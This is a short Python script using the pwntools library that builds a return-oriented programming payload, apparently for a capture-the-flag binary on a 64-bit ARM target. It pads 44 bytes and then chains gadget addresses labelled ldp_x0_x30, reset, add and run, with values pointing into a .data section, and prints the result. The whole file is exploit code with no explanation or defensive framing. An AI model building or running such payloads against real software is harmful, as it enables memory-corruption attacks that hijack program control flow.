from pwn import *

ldp_x0_x30 = p64(0x100000568)
run = p64(0x100000554) # +b"A"*8
ls = p64(0x100008080) # .data
la = p64(0x100008088) # .data
reset = p64(0x100000500) # +b"A"*8
add = p64(0x100000528)  # +b"A"*8
buf = b"A"*8
fake_data = p64(1)
main = p64(0x100000580)

p = b"A"*44
p += ldp_x0_x30 + fake_data + reset + buf
p += ldp_x0_x30 + ls + add + buf + buf + buf
p += ldp_x0_x30 + la + add + buf + buf + buf
p += run

print(p)
